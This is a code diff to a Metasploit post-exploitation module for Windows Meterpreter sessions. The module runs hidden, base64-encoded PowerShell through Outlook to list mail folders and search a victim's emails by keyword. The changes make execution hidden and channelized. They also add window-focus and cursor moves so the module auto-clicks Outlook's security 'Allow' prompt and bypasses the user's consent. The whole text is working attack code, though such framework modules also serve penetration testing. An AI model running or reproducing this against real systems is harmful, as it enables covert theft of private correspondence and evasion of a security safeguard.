@@ -23,7 +23,7 @@ class Metasploit3 < Msf::Post
     'License'       => MSF_LICENSE,
     'Author'        => [ 'Wesley Neelen <security[at]forsec.nl>' ],
     'Platform'      => [ 'win' ],
-    'Arch'		=> [ 'x86', 'x64' ],
+    'Arch'		    => [ 'x86', 'x64' ],
     'SessionTypes'  => [ 'meterpreter']
   ))
 
@@ -52,10 +52,13 @@ class Metasploit3 < Msf::Post
     |
     utf16conv = Iconv.conv('UTF16LE', 'ASCII', psh_script)
     encoded_psh = Rex::Text.encode_base64(utf16conv)
-    listBoxes_res = cmd_exec('powershell', '-enc ' + encoded_psh)
+    listBoxes_res = session.sys.process.execute("powershell.exe -enc #{encoded_psh}", nil, {'Hidden' => true, 'Channelized' => true})
+    sleep 3
+    print listBoxes_res.channel.read
+    listBoxes_res.channel.close
+    listBoxes_res.close
     currentidle = session.ui.idle_time
     print_status("System has currently been idle for #{currentidle} seconds")
-    print_status listBoxes_res
   end
 
   def readEmails(folder,keyword,searchobject,atrans,acftrans)
@@ -70,16 +73,24 @@ class Metasploit3 < Msf::Post
       $Outlook = New-Object -ComObject Outlook.Application
       $Namespace = $Outlook.GetNameSpace("MAPI")
       $NameSpace.Folders.Item(1)
+      try {
       $Email = $NameSpace.Folders.Item(1).Folders.Item($Folder).Items
       $Email \| Where-Object {$_.$searchObject -like '*' + $searchTerm + '*'}
       Write-Host $Email
+      } catch {
+        Write-Host "The folder does not exist in the Outlook installation. Please fill in a correct foldername."
+      }
       }
       Get-Emails "#{keyword}" "#{folder}" "#{searchobject}"
     |
     utf16conv = Iconv.conv('UTF16LE', 'ASCII', psh_script)
     encoded_psh = Rex::Text.encode_base64(utf16conv)
-    readEmails_res = cmd_exec('powershell', '-enc ' + encoded_psh)
-    print_status readEmails_res
+    readEmails_res = session.sys.process.execute("powershell.exe -enc #{encoded_psh}", nil, {'Hidden' => true, 'Channelized' => true})
+    while(d = readEmails_res.channel.read)
+       print ("#{d}")
+    end
+    readEmails_res.channel.close
+    readEmails_res.close
   end
 
   def clickButton(atrans,acftrans)
@@ -91,6 +102,8 @@ class Metasploit3 < Msf::Post
     client.railgun.user32.MoveWindow(hwnd['return'],150,150,1,1,true)
     hwndChild = client.railgun.user32.FindWindowExW(hwnd['return'], nil, "Button", "#{atrans}")
     client.railgun.user32.SetActiveWindow(hwndChild['return'])
+    client.railgun.user32.SetForegroundWindow(hwndChild['return'])
+    client.railgun.user32.SetCursorPos(150,150)
     client.railgun.user32.mouse_event(0x0002,150,150,nil,nil)
     client.railgun.user32.SendMessageW(hwndChild['return'], 0x00F5, 0, nil)
   end
@@ -107,16 +120,16 @@ class Metasploit3 < Msf::Post
     # OS language check
     sysLang = client.sys.config.sysinfo['System Language']
     if sysLang != "en_US" and sysLang != "NL"
-      if allow.nil? or allow_access_for.nil?
         print_error ("System language not supported, only English (en-US) and Dutch (NL) are supported, you can specify the targets system translations in the options A_TRANSLATION (Allow) and ACF_TRANSLATION (Allow access for)")
         abort()
-      else
-        atrans = allow
-        acftrans = allow_access_for
-      end
     else
       atrans = A_HASH[sysLang]
       acftrans = ACF_HASH[sysLang]
+    end
+
+    if allow and allow_access_for
+       atrans = allow
+       acftrans = allow_access_for
     end
 
     # Outlook installed
@@ -158,7 +171,7 @@ class Metasploit3 < Msf::Post
       print_status('Not printing folders, LIST_FOLDERS disabled')
     end
 
-    if folder
+    if folder and folder != ""
       readEmails(folder,keyword,object,atrans,acftrans)
     end
   end
